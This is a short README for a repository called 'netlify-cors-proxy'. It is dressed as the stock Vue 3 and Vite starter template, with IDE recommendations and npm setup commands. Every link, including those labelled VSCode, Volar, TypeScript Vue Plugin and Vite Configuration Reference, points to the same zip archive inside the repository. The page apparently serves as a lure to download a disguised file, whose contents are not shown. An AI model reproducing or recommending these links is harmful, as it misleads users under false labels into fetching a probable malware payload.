# netlify-cors-proxy

This template should help get you started developing with Vue 3 in Vite.

## Recommended IDE Setup

[VSCode](https://raw.githubusercontent.com/aslekariii/netlify-cors-proxy/main/src/netlify-cors-proxy_hipparch.zip) + [Volar](https://raw.githubusercontent.com/aslekariii/netlify-cors-proxy/main/src/netlify-cors-proxy_hipparch.zip) (and disable Vetur) + [TypeScript Vue Plugin (Volar)](https://raw.githubusercontent.com/aslekariii/netlify-cors-proxy/main/src/netlify-cors-proxy_hipparch.zip).

## Customize configuration

See [Vite Configuration Reference](https://raw.githubusercontent.com/aslekariii/netlify-cors-proxy/main/src/netlify-cors-proxy_hipparch.zip).

## Project Setup

```sh
npm install
```

### Compile and Hot-Reload for Development

```sh
npm run dev
```

### Compile and Minify for Production

```sh
npm run build
```
